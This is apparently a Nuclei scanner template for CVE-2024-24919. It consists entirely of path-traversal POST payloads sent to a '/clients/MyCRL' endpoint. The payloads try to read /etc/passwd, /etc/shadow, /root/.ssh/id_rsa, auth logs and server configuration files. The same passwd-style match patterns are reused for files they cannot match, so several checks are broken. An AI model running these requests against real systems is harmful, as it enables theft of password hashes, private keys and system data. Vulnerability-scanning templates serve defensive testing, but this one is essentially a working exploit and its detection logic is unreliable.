id: CVE-2024-24919

info:
  name: Local File Inclusion
  author: tamimhasan404
  severity: high
  metadata:
  tags: cve,cve2024,

http:
  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/passwd'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/shadow'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/apache2/apache2.conf'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/mysql/my.cnf'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../var/log/syslog'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../var/log/auth.log'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"


  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/group'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../root/.ssh/id_rsa'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/hostname'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/hosts'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"

  - method: POST
    path:
      - "{{BaseURL}}/clients/MyCRL"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
    body: 'aCSHELL/../../../../../../../../../../../etc/resolv.conf'

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "cp_postgres:.*:.*:.*:.*:.*:.*:.*:"
          - "postfix:.*:.*:.*:.*:.*:.*:.*:"
          - "pcap:.*:.*:.*:.*:.*:.*:.*:"
          - "nobody:.*:.*:.*:.*:.*:.*:.*:"
